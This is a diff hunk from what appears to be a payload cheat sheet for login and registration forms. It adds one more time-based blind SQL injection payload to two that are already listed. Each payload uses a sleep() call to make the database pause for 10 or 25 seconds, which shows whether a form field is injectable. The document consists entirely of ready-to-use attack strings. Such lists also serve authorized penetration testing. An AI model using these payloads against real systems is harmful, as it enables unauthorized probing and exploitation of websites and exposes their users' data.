@@ -9,6 +9,7 @@ Login and register payloads:
 Sql injection:
 (select(0)from(select(sleep(25)))v) --> Blind 25 seconds
 /0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z/ --> Time based 10 seconds
+(select*from(select(sleep(10)))a) --> time based 10 seconds
 
 
 
